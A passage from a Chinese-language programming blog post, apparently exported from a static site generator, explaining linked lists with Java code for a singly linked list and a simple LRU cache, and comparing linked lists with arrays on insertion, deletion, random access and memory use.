class=\"keyword\">private</span> T <span class=\"title\">deleteNode</span><span class=\"params\">(Node&lt;T&gt; deleteNode)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = deleteNode.val;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!= <span class=\"keyword\">null</span> &amp;&amp; p.next != deleteNode)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = deleteNode.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据索引获取值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node(index).val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 通过value 查找对应的索引</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            index ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.next != <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> Node&lt;T&gt; <span class=\"title\">node</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i == index)&#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            ++i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkFirst(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; first = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"没有元素\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst(first);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">(Node&lt;T&gt; node)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = node.val;</span><br><span class=\"line\">        head.next = head.next.next;</span><br><span class=\"line\">        node.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        node.val = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 单链表反转</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 链表为空或者链表只有一个元素时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span> || size &lt;=<span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        Node&lt;T&gt; q = p.next;</span><br><span class=\"line\">        Node&lt;T&gt; r;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        head.next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打印链表 example: [1, 2, 3]</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"[]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            sb.append(p.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(p.val).append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> T val;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Node&lt;T&gt; next;</span><br><span class=\"line\">        Node(T val)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基于链表的LRU缓存代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">T <span class=\"title\">get</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ListLRUCache</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SinglyLinkedList&lt;T&gt; lruList;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP=<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 缓存容量</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> cap;</span><br><span class=\"line\">    <span class=\"comment\">// 缓存使用大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(DEFAULT_CAP);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.lruList = <span class=\"keyword\">new</span> SinglyLinkedList&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T value)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">            <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">            lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">            <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        T result = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lruList.contains(val))&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 在list中,从list中获取该数据</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> index = lruList.indexOf(val);</span><br><span class=\"line\">            result = lruList.get(index);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"从缓存中获取\"</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该节点插入到链表头部</span></span><br><span class=\"line\">            lruList.delete(index);</span><br><span class=\"line\">            lruList.push(val);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"缓存中没有该数据！\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">                <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">                lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"缓存已满！将该数据插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">                <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                size++;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"将该数据直接插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果有数据库，该数据从数据库中获取</span></span><br><span class=\"line\">            result = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>字符串是否是回文字符串：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。</p>\n<p>缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。</p>\n<p>缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。</p>\n<p>今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表及其结构\"><a href=\"#链表及其结构\" class=\"headerlink\" title=\"链表及其结构\"></a>链表及其结构</h3></div><br></div>\n\n<p>相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。</p>\n<p>我们先从<strong>底层存储结构</strong>来看一下二者的区别：</p>\n<p>为了直观的对比，我画了一张图，从图中可以看到，<strong>数组需要一块连续的内存空间来存储</strong>，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。</p>\n<p>而链表恰恰相反，它并不需要一块连续的内存空间，他<strong>通过“指针”将一组零散的内存块连接起来</strong>使用，所以申请一块大小是100MB的链表，根本不会有问题。</p>\n<img src=\"/posts/2018-09-12-算法-链表/数组与链表结构对比.jpg\" title=\"数组与链表结构对比\">\n<p>链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。</p>\n<h4 id=\"单链表\"><a href=\"#单链表\" class=\"headerlink\" title=\"单链表\"></a>单链表</h4><p>首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“<strong>结点</strong>”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做<strong>后继指针 next</strong>。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表.jpg\">\n<p>从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为<strong>头结点</strong>，最后一个节点称为<strong>尾结点</strong>。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。</p>\n<p>与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。</p>\n<p>为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表插入删除.jpg\">\n<p>但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。</p>\n<p>你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。</p>\n<p>好了，单链表了解了，下面来看看另外两个复杂的链表：<strong>循环链表和双向链表</strong>。</p>\n<h4 id=\"循环链表\"><a href=\"#循环链表\" class=\"headerlink\" title=\"循环链表\"></a>循环链表</h4><p><strong>循环链表是一种特殊的单链表</strong>。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。</p>\n<img src=\"/posts/2018-09-12-算法-链表/循环链表.jpg\">\n<p>和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。</p>\n<h4 id=\"双线链表\"><a href=\"#双线链表\" class=\"headerlink\" title=\"双线链表\"></a>双线链表</h4><p>接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：<strong>双向链表</strong>。</p>\n<p>单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向链表.jpg\">\n<p>从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？</p>\n<p>从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。</p>\n<p>你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。</p>\n<p>我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：</p>\n<ul>\n<li>删除结点中“值等于某个给定值的”结点</li>\n<li>删除给定指针指向的结点</li>\n</ul>\n<p>对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。</p>\n<p>尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。</p>\n<p>对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。</p>\n<p>但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！</p>\n<p>同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。</p>\n<p>除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。</p>\n<p>现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。</p>\n<p>实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。</p>\n<p>还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。</p>\n<p>所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？</p>\n<p>了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：<strong>双向循环链表</strong>。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向循环链表.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表-VS-数组性能大比拼\"><a href=\"#链表-VS-数组性能大比拼\" class=\"headerlink\" title=\"链表 VS 数组性能大比拼\"></a>链表 VS 数组性能大比拼</h3></div><br></div>\n\n<p>通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。</p>\n<table>\n<thead>\n<tr>\n<th>时间复杂度</th>\n<th>数组</th>\n<th>链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入删除</td>\n<td>O(n)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>随机访问</td>\n<td>O(1)</td>\n<td>O(n)</td>\n</tr>\n</tbody>\n</table>\n<p>不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。</p>\n<p>数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。</p>\n<p>数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。</p>\n<p>你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。</p>\n<p>我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。</p>\n<p>除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。</p>\n<p>所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" 